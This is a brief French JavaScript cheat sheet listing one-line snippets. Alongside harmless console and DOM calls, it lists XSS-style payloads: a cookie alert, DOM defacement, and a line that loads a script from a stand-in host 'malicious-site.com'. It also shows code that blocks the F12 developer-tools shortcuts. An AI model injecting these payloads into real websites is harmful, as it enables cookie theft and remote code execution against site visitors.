JavaScript

  • console.log('message'); - Affiche un message dans la console

  • document.getElementById('id'); - Sélectionne un élément par son ID

  • alert('XSS') - Affiche une alerte

  • alert(document.cookie) - Affiche le cookie

  • document.getElementById('target').innerHTML = '<.h1>Hacked!<./h1>' - Manipulation DOM

  • var script = document.createElement('script'); script.src = 'http://malicious-site.com/malicious.js'; document.body.appendChild(script) - Ajout d'un script malveillant

  • document.onkeydown = function(e) { if (e.keyCode === 123) { // F12 return false; } if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) { return false; } }; - Bypasss F12

  • console.log(Object.getOwnPropertyNames(window)) - les APIs disponible sur un site
